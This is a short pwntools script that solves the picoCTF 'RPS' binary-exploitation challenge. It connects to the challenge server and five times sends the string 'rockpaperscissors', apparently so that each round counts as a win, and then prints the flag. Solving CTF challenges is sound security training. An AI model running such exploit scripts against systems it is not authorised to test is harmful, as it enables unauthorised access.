import os
from pwn import *
###################setup file and elf files####################
level = "RPS"
ip = "saturn.picoctf.net:56978"
os.chdir("/home/ayush/Work/picoCTF/BinaryExploitation/"+level)
print(os.getcwd())

context.arch = 'amd64'
elf = ELF("./game.out")
######################start process##########################

# r = process("./game.out")
r = remote(ip.split(':')[0], ip.split(':')[1])

#####################simple interactions to solve###################### 
for _ in range(5):
    r.sendlineafter("program", "1")
    r.recvuntil("selection")
    r.sendline("rockpaperscissors")
    r.recvuntil("win")
log.info(r.recv())
flag = r.recv()
log.info(flag)
r.close()